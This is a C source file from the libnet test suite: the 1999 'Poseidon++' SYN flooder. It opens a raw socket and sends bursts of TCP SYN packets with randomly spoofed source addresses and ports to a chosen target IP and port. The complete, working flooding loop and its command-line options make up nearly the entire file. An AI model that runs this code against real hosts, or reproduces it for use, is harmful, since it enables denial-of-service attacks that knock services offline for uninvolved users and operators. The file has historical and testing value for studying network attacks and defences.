/*
 *  $Id: syn-flood.c,v 1.1.1.1 1999/05/18 15:33:42 dugsong Exp $
 *
 *  Poseidon++ (c) 1996, 1997, 1998, 1999 daemon9|route <route@infonexus.com>
 *  SYN flooder rewritten for no good reason.  Again as libnet test module.
 *  Copyright (c) 1998, 1999 Mike D. Schiffman <mike@infonexus.com>
 *                           route|daemon9 <route@infonexus.com>
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

#if (HAVE_CONFIG_H)
#include "../../include/config.h"
#endif
#include "../libnet_test.h"

struct t_pack
{
    struct ip ip;
    struct tcphdr tcp;
};


int
main(int argc, char **argv)
{
    u_long dst_ip   = 0;
    u_long src_ip   = 0;
    u_short dst_prt = 0;
    u_short src_prt = 0;
    u_char *cp, *buf;
    int i, c, packet_amt, burst_int, sockfd, burst_amt;

    packet_amt  = 0;
    burst_int   = 0;
    burst_amt   = 1;

    while((c = getopt(argc, argv, "t:a:i:b:")) != EOF)
    {
        switch (c)
        {
            /*
             *  We expect the input to be of the form `ip.ip.ip.ip.port`.  We
             *  point cp to the last dot of the IP address/port string and
             *  then seperate them with a NULL byte.  The optarg now points to
             *  just the IP address, and cp points to the port.
             */
            case 't':
                if (!(cp = strrchr(optarg, '.')))
                {
                    usage(argv[0]);
                    exit(EXIT_FAILURE);
                }
                *cp++ = 0;
                dst_prt = (u_short)atoi(cp);
                if (!(dst_ip = name_resolve(optarg, 1)))
                {
                    fprintf(stderr, "Bad IP address: %s\n", optarg);
                    exit(EXIT_FAILURE);
                }
                break;

            case 'a':
                packet_amt  = atoi(optarg);
                break;

            case 'i':
                burst_int   = atoi(optarg);
                break;

            case 'b':
                burst_amt   = atoi(optarg);
                break;

            default:
                usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    if (!dst_prt || !dst_ip || !packet_amt)
    {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if ((sockfd = open_raw_sock(IPPROTO_RAW)) == -1)
    {
        perror("socket allocation");
        exit(EXIT_FAILURE);
    }

    buf = malloc(TCP_H + IP_H);
    if (!buf)
    {
        perror("No memory for packet header");
        exit(EXIT_FAILURE);
    }
    memset(buf, 0, TCP_H + IP_H);

    seed_prand();

    for(; burst_amt--;)
    {
        for (i = 0; i < packet_amt; i++)
        {
            build_ip(TCP_H,
                    0,
                    get_prand(PRu16),
                    0,
                    get_prand(PR8),
                    IPPROTO_TCP,
                    src_ip = get_prand(PRu32),
                    dst_ip,
                    NULL,
                    0,
                    buf);

            build_tcp(src_prt = get_prand(PRu16),
                    dst_prt,
                    get_prand(PRu32),
                    get_prand(PRu32),
                    TH_SYN,
                    get_prand(PRu16),
                    0,
                    NULL,
                    0,
                    buf + IP_H);

            do_checksum(buf, IPPROTO_TCP, TCP_H);

            c = write_ip(sockfd, buf, TCP_H + IP_H);
            if (c < TCP_H + IP_H)
            {
                fprintf(stderr, "write_ip\n");
            }
            usleep(250);
            printf("%15s:%5d ------> %15s:%5d\n", 
                    host_lookup(src_ip, 1),
                    ntohs(src_prt),
                    host_lookup(dst_ip, 1),
                    dst_prt);
        }
        sleep(burst_int);
    }
    free(buf);
    exit(EXIT_SUCCESS);
}


void
usage(u_char *nomenclature)
{
    fprintf(stderr,
        "\n\nusage: %s -t -a [-i -b]\n"
        "\t-t target, (ip.address.port: 192.168.2.6.23)\n"
        "\t-a number of packets to send per burst\n"
        "\t-i packet burst sending interval (defaults to 0)\n"
        "\t-b number packet bursts to send (defaults to 1)\n" , nomenclature);
}


/* EOF */
